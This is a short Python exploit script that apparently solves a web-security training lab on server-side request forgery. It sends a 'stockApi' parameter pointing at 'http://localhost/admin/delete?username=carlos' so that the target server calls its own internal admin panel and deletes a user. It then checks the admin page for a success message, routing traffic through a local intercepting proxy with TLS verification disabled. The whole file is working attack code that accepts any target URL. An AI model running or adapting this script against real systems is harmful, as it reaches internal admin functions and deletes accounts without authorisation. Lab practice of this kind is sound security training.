import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def http_request(url):
    vuln_parameter = '/product/stock'
    payload = 'http://localhost/admin/delete?username=carlos'
    parameter_payload = {'stockApi': payload}
    r = requests.post(url + vuln_parameter, data= parameter_payload, verify=False, proxies=proxy)
    print(r)


def check_payload(url):
    http_request(url)
    vuln_parameter = '/product/stock'
    payload = 'http://localhost/admin'
    parameter_payload = {'stockApi': payload}
    r = requests.post(url + vuln_parameter, data=parameter_payload, verify=False, proxies=proxy)
    res = r.text
    if 'User deleted successfully!' in res:
        print('[+] Delete successed !')



def main():
    if len(sys.argv) !=2:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    check_payload(url)

if __name__ == "__main__":
    main()